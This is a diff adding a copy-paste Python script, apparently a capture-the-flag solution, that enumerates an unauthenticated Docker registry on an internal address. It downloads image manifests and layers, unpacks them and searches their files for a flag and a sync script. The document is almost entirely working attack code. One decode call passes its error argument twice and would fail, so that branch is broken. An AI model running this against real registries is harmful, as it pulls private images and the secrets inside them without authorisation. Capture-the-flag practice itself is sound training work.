@@ -1,0 +1,127 @@
+# STOLEN SCHEMATICS - Single Command Solution
+# Copy-paste this ENTIRE block into SSH
+
+python3 << 'PYEND'
+import urllib.request, json, gzip, io, tarfile
+
+REG = "http://172.27.0.1:5000"
+
+def gj(u):
+    r = urllib.request.Request(u)
+    r.add_header("Accept", "application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json")
+    return json.load(urllib.request.urlopen(r, timeout=20))
+
+print("="*60)
+print("STOLEN SCHEMATICS - Automated Extraction")
+print("="*60)
+
+try:
+    # Get all repos
+    catalog = gj(f"{REG}/v2/_catalog")
+    print(f"\nRepositories: {catalog.get('repositories', [])}")
+    
+    # Focus on watcher images first
+    priority_targets = [
+        ("images/stolen-schematics-watcher", ["team131-fix", "v1"]),
+        ("infra/stolen-schematics-diagnostic", ["team131-v2", "team131"]),
+    ]
+    
+    for repo, tags in priority_targets:
+        for tag in tags:
+            print(f"\n{'='*60}")
+            print(f"Checking {repo}:{tag}")
+            print("="*60)
+            
+            try:
+                manifest = gj(f"{REG}/v2/{repo}/manifests/{tag}")
+                layers = manifest.get("layers", [])
+                print(f"Layers: {len(layers)}")
+                
+                for idx, L in enumerate(layers):
+                    digest = L.get("digest")
+                    size = L.get("size", 0)
+                    
+                    if size > 30000000:  # Skip large layers
+                        print(f"  Layer {idx}: {size:,} bytes (skipping - too large)")
+                        continue
+                    
+                    print(f"\n  Layer {idx}: {size:,} bytes, {digest[:30]}...")
+                    
+                    try:
+                        blob = urllib.request.urlopen(f"{REG}/v2/{repo}/blobs/{digest}", timeout=30).read()
+                        
+                        # Decompress
+                        try:
+                            raw = gzip.decompress(blob)
+                        except:
+                            raw = blob
+                        
+                        # Quick flag search
+                        if b"TDHT{" in raw:
+                            print("\n" + "🎯"*30)
+                            print("FLAG FOUND IN RAW DATA!")
+                            print("🎯"*30)
+                            i = raw.find(b"TDHT{")
+                            print(raw[i:i+150].decode('utf-8','replace'))
+                            exit(0)
+                        
+                        # Extract tarball
+                        try:
+                            tf = tarfile.open(fileobj=io.BytesIO(raw))
+                            
+                            for mem in tf.getmembers():
+                                if not mem.isfile():
+                                    continue
+                                
+                                name = mem.name
+                                
+                                # Found sync-loop.sh!
+                                if 'sync-loop.sh' in name or 'sync_loop' in name:
+                                    print(f"\n{'='*60}")
+                                    print(f"📜 FOUND: {name}")
+                                    print("="*60)
+                                    content = tf.extractfile(mem).read().decode('utf-8', 'replace')
+                                    print(content)
+                                    
+                                    if "TDHT{" in content:
+                                        print("\n🎯 FLAG IN SCRIPT!")
+                                        exit(0)
+                                
+                                # Check small files for flag
+                                if mem.size < 5000000:
+                                    try:
+                                        c = tf.extractfile(mem).read()
+                                        if b"TDHT{" in c:
+                                            print(f"\n{'='*60}")
+                                            print(f"🎯 FLAG in {name}!")
+                                            print("="*60)
+                                            print(c.decode('utf-8','replace')[:500])
+                                            exit(0)
+                                    except:
+                                        pass
+                        
+                        except tarfile.TarError:
+                            # Not a tarball, search as text
+                            text = raw.decode('utf-8', 'replace', errors='ignore')
+                            if 'TDHT{' in text:
+                                print("\n🎯 FLAG in layer text!")
+                                i = text.find('TDHT{')
+                                print(text[i:i+150])
+                                exit(0)
+                    
+                    except Exception as e:
+                        print(f"    Error: {str(e)[:80]}")
+            
+            except Exception as e:
+                print(f"  Manifest error: {str(e)[:80]}")
+    
+    print("\n" + "="*60)
+    print("No flag found in priority images")
+    print("="*60)
+
+except Exception as e:
+    print(f"Error: {e}")
+    import traceback
+    traceback.print_exc()
+
+PYEND
